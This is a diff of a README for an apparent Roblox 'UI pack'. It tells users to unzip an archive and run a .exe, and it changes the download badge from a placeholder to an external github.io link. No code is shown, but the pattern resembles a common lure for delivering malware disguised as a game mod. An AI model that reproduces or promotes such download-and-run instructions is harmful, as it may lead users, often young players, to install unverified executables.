@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install the UI enhancement automatically.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://ui-pack-for-roblox.github.io/.github/)
 
 ## 📸 Overview
 ![roblox-ui-pack-hud](https://github.com/user-attachments/assets/be66505a-8215-4f8f-9836-d79642125652)
